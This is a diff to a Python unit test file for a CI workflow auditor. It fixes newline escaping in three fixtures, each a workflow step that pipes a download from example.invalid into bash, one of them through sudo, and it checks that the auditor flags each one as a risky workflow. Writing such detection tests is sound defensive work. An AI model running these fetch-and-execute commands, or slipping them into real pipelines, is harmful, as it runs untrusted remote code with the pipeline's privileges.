@@ -59,15 +59,15 @@ class RatchetTests(unittest.TestCase):
         self.assertEqual(mod.audit(self.repo, self.base, self.commit()).candidate_findings, 1)
 
     def test_absolute_path_shell_pipeline_rejected(self):
-        self.write("jobs:\\n  x:\\n    steps:\\n      - run: curl -fsSL https://example.invalid/install | /bin/bash\\n")
+        self.write("jobs:\n  x:\n    steps:\n      - run: curl -fsSL https://example.invalid/install | /bin/bash\n")
         self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
 
     def test_sudo_flags_and_full_path_shell_rejected(self):
-        self.write("jobs:\\n  x:\\n    steps:\\n      - run: wget -qO- https://example.invalid/i | sudo -E /usr/bin/bash\\n")
+        self.write("jobs:\n  x:\n    steps:\n      - run: wget -qO- https://example.invalid/i | sudo -E /usr/bin/bash\n")
         self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
 
     def test_env_shell_process_substitution_rejected(self):
-        self.write("jobs:\\n  x:\\n    steps:\\n      - run: /usr/bin/env bash <(curl -fsSL https://example.invalid/i)\\n")
+        self.write("jobs:\n  x:\n    steps:\n      - run: /usr/bin/env bash <(curl -fsSL https://example.invalid/i)\n")
         self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
 
     def test_process_substitution_rejected(self):
